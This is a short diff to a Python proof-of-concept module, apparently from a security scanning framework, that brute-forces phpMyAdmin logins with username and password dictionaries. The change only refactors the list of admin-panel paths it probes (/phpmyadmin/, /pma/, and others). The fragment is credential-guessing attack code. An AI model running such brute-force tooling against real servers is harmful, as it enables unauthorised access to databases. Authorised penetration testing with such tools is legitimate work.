@@ -29,19 +29,14 @@ class POC(Script):
             # flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_service_type">','class="disableAjax" title=']
             usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'phpmyadmin_usernames.txt'))
             passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'phpmyadmin_passwords.txt'))
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './phpmyadmin/'),
-                self.url_normpath(self.base_url, '/phpmyadmin/'),
-                self.url_normpath(self.url, './pma/'),
-                self.url_normpath(self.base_url, '/pma/'),
-                self.url_normpath(self.url, './'),
-                self.url_normpath(self.url, './phpMyAdmin/'),
-                self.url_normpath(self.base_url, '/phpMyAdmin/'),
-            ]))
             headers = {"Content-Type": "application/x-www-form-urlencoded"}
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, [
+                    './phpMyAdmin/',
+                    './pma/',
+                    '/phpmyadmin/',
+                    './',
+                ]):
                     url = path + 'index.php'
                     async with session.get(url=url, headers=headers) as res1:
                         if res1:
